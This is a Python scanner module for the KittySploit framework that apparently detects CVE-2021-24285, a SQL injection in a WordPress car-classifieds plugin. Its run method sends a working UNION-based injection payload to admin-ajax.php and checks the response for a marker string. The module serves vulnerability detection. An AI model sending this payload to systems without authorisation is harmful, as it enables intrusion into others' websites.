#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The request_list_request AJAX call of the Car Seller - Auto Classifieds Script WordPress plugin through 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Car Seller - Auto Classifieds Script - SQL Injection Detection',
        'description': 'The request_list_request AJAX call of the Car Seller - Auto Classifieds Script WordPress plugin through 2.1.0, available to both authenticated and unauthenticated users, does not sanitize, validate or escape the order_id POST parameter before using it in a SQL statement, leading to a SQL injection issue.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve2021',
            'cve',
            'wordpress',
            'wp-plugin',
            'sqli',
            'wpscan',
            'cars-seller-auto-classifieds-script_project',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://codevigilant.com/disclosure/2021/wp-plugin-cars-seller-auto-classifieds-script-sql-injection/',
            'https://wpscan.com/vulnerability/f35d6ab7-dd52-48b3-a79c-3f89edf24162',
            'https://codevigilant.com/disclosure/2021/24-04-2021-wp-plugin-cars-seller-auto-classifieds-script-sql-injection/',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/SexyBeast233/SecBooks',
        ],
        'cve': 'CVE-2021-24285',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='action=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('qzvvqhWAAlCfTiMDmAoqzkTpJEzPwVFSaIpfAfdfTinrMqqxkq',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='WordPress Car Seller - Auto Classifieds Script - SQL Injection detected', path=path)
            return True
        return False

